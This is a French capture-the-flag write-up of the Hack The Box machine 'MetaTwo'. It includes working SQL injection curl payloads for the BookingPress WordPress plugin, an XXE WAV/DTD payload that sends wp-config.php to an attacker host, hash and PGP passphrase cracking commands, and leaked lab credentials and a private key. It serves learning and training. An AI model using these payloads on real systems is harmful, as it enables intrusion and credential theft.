# MetaTwo - Easy

Analyse nmap: 1 FTP et 1 serveur web

```sql
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 18:04 EDT
Nmap scan report for 10.10.11.186
Host is up (0.041s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.92%I=7%D=11/3%Time=63643B00%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.22 seconds
```

gobuster dir

```sql
	===============================================================
/.htaccess            (Status: 200) [Size: 633]
/0                    (Status: 301) [Size: 0] [--> http://metapress.htb/0/]
/a                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/A                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/about                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/About                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/about-us             (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]
/admin                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-admin/]
/atom                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/atom/]
/c                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/C                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/ca                   (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/can                  (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]
/dashboard            (Status: 302) [Size: 0] [--> http://metapress.htb/wp-admin/]          
/E                    (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/e                    (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/embed                (Status: 301) [Size: 0] [--> http://metapress.htb/embed/]             
/event                (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/events               (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            
/Events               (Status: 301) [Size: 0] [--> http://metapress.htb/Events/]            
/feed                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]              
/H                    (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/h                    (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/hello                (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]       
/index.php            (Status: 301) [Size: 0] [--> http://metapress.htb/]                   
/login                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-login.php]       
/page1                (Status: 301) [Size: 0] [--> http://metapress.htb/]                   
/rdf                  (Status: 301) [Size: 0] [--> http://metapress.htb/feed/rdf/]          
/robots.txt           (Status: 200) [Size: 113]                                             
/rss                  (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]              
/rss2                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]              
/s                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/S                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/sa                   (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/sample               (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/sam                  (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]       
/sitemap.xml          (Status: 302) [Size: 0] [--> http://metapress.htb/wp-sitemap.xml]     
/t                    (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]         
/T                    (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]         
/th                   (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]         
/thank-you            (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]         
/wp-admin             (Status: 301) [Size: 169] [--> http://metapress.htb/wp-admin/]        
/wp-content           (Status: 301) [Size: 169] [--> http://metapress.htb/wp-content/]      
/wp-includes          (Status: 301) [Size: 169] [--> http://metapress.htb/wp-includes/]     
/xmlrpc.php           (Status: 405) [Size: 42]
```

nikto 

```sql
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.11.186
+ Target Hostname:    metapress.htb
+ Target Port:        80
+ Start Time:         2022-11-03 18:10:22 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/8.0.24
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'link' found, with contents: <http://metapress.htb/wp-json/>; rel="https://api.w.org/"
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ File/dir '/wp-admin/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Uncommon header 'x-robots-tag' found, with contents: noindex
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Server leaks inodes via ETags, header found with file /.htaccess, fields: 0x62b4accc 0x279 
+ OSVDB-3093: /.htaccess: Contains authorization information
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /wp-app.log: Wordpress' wp-app.log may leak application/system details.
+ /wordpress/: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ 6544 items checked: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2022-11-03 18:20:56 (GMT-4) (634 seconds)
---------------------------------------------------------------------------
```

page wp-admin: la BDD indique que le compte “admin” existe

contenu robots.txt :

```sql
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://metapress.htb/wp-sitemap.xml
```

Version de wordpress: WordPress 5.6.2

Check des plugins ? Les plugins WP sont connus pour avoir des vulnérabilités 

Galère à trouver une alternative à wpscan

J’étais en train de regarder si je pouvais pas trouver les plugins à la main dans le code source puis j’ai vu le théme “twentytwentyone”. Juste après je regarde un article : [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)

Peut être une piste ? En fait pas vulnérable pour cette version

Installation de wpscan direct depuis ruby, apt veut pas (gem install)

Il faut avoir une clé api sur wpscan pour avoir un scan complet

La méthode passive ne donne rien alors je force le scan aggressif

Le scan est long (genre 30 min) donc lancement d’un scan “mixed” pour essayer de gagner du temps + plugins only

```bash
wpscan --url http://metapress.htb --api-token yourkey --plugins-detection mixed --enumerate vp
```

Résultat du mixed:

```bash
i] Plugin(s) Identified:

[+] bookingpress-appointment-booking
 | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/
 | Last Updated: 2022-11-02T08:20:00.000Z
 | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | [!] The version is out of date, the latest version is 1.0.46
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: BookingPress < 1.0.11 - Unauthenticated SQL Injection
 |     Fixed in: 1.0.11
 |     References:
 |      - https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739
 |      - https://plugins.trac.wordpress.org/changeset/2684789
 |
 | Version: 1.0.10 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt
 | Confirmed By: Translation File (Aggressive Detection)
 |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'
```

On va donc explorer cette piste en regardant les références (Unauthenticated SQL Injection [CVE-2022-0739](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739) - très récent)

Voici la POC:

```bash
- Create a new "category" and associate it with a new "service" via the BookingPress admin menu (/wp-admin/admin.php?page=bookingpress_services)
- Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step Wizard Form")
- Visit the just created page as an unauthenticated user and extract the "nonce" (view source -> search for "action:'bookingpress_front_get_category_services'")
- Invoke the following curl command

curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=nonce&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'

Time based payload:  curl -i 'https://example.com/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=nonce&category_id=1&total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH'
```

Et un exemple d’exploit: https://github.com/destr4ct/CVE-2022-0739

Il faut donc trouver un nonce quelque part, or /events comporte le plugin et on trouve le nonce dans le code source. On peut alors utiliser la commande curl 

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=nonce&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

La commande fail pour une raison inconnue, analyse du code POC précédent.

C’est le https qui était coupable

Avec l’exploit python:

```bash
10.5.15-MariaDB-0+deb11u1
```

```bash
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

Exploitation manuelle:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=nonce&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

```bash
[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

2éme requete (en cherchant on trouve que le nom par défaut des tables utilisateur est wp_users: 

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=nonce&category_id=33&total_service=-7502) UNION ALL SELECT user_login, user_pass, 1,1,1,1,1,1,1 FROM wp_users-- -'
```

Apparremment il faut selectionner toutes les colonnes pour que ça retourne quelque chose

```bash
[{"bookingpress_service_id":"admin","bookingpress_category_id":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.","bookingpress_service_name":"1","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"1","bookingpress_service_duration_unit":"1","bookingpress_service_description":"1","bookingpress_service_position":"1","bookingpress_servicedate_created":"1","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"manager","bookingpress_category_id":"$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70","bookingpress_service_name":"1","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"1","bookingpress_service_duration_unit":"1","bookingpress_service_description":"1","bookingpress_service_position":"1","bookingpress_servicedate_created":"1","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

[https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier) → on apprend que c’est peut être du MD5 sur wordpress donc on va utiliser un site pour essayer de trouver le mdp en clair sans utiliser hashcat

```bash
Possible algorithms: phpass, phpBB3 (MD5), Joomla >= 2.5.18 (MD5), WordPress (MD5)
```

peut être du salt sur le hash ? En fait sûrement du phpass

grâce à hashcat on récupére le mdp de “manager”, c’est du phpass [https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/](https://blog.wpsec.com/cracking-wordpress-passwords-with-hashcat/)

```bash
.\hashcat.exe -m 400 -a 0 -o .\cracked.txt .\pass.txt .\rockyou.txt
```

Pas possible d’upload des fichiers php depuis le panel, pas possible de bypass l’upload…

Autre vuln authentifié ?

```bash
| [!] 28 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
 |     Fixed in: 5.6.3
 |     References:
 |      - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/29378
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh
 |      - https://blog.sonarsource.com/wordpress-xxe-security-vulnerability/
 |      - https://hackerone.com/reports/1095645
 |      - https://www.youtube.com/watch?v=3NBxcmqCgt4
 |
```

La 1ère à l’air prometteuse → voici la POC:

```bash
payload.wav:

RIFFXXXXWAVEBBBBiXML<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://attacker-url.domain/xxe.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>>

xxe.dtd:

<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker-url.domain/?%data;'>">
```

On lance alors un serveur python 🙂

DTD = Document Type Definition

Suivre : [https://tryhackme.com/room/wordpresscve202129447](https://www.notion.so/Cours-9-9d245a0bbf5249789c5ffdddcb7e37b2) car si on suit la POC on a pas le bon encodage pour les carac 😟

On obtient des infos en base64

```bash
[Fri Nov  4 14:16:18 2022] 10.10.11.186:38386 [404]: (null) /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory
```

En modifiant la resource on peut alors chopper n’importe quel fichier sur le serveur 🙂

Il faut décoder avec la fonction php qui est spécifiée sinon ça marche pas !

Il faut créer un fichier php pour décoder 

```bash
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

Voici le wp-config.php:

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

là on a un tas d’infos, dont le mdp d’un user ftp (enfin), on peut essayer de voir ce qu’il y a à trouver sur le ftp 🙂 (avant de voler toutes les clés RSA ??)

pas de put de permis 😟 

On trouve des logs SSH dans un fichier de config php !

On a donc enfin le flag user maintenant il faut privesc

Pas de droits sudo, pas d’accès à SQL, pas d’autres users

Je trouve rien à faire donc j’upload linpeas et je lance mais rien de concret

En fait y’a un dossier caché dans le /home :)

C’est le mdp root chiffré avec pgp

```
-----BEGIN PGP MESSAGE-----

  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
  lpF0RatbxQGWBks5F3o=
  =uh1B

  -----END PGP MESSAGE-----
```

On a aussi une clé caché dans le répertoire (quelle aubaine):

```
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

(comme par hasard on a accès à nano aussi)

Il faut la passphrase pour importer la clé dans notre liste !

Je tombe alors sur un tuto pour cracker la passphrase: [https://www.youtube.com/watch?v=X4NV_NBL0h4](https://www.youtube.com/watch?v=X4NV_NBL0h4)

On obtient alors:

```
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::key
```

puis

```
john john_key --wordlist /usr/share/wordlists/rockyou.txt
```

On obtient alors la passphrase

```
gpg --import pgp_key
```

Puis on déchiffre avec la même passphrase:

```
gpg --decrypt pass.pgp
```

On obtient le mdp root, on essaye de se connecter à distance mais ça marche pas donc su root et on a accès ! 

On obtient le flag root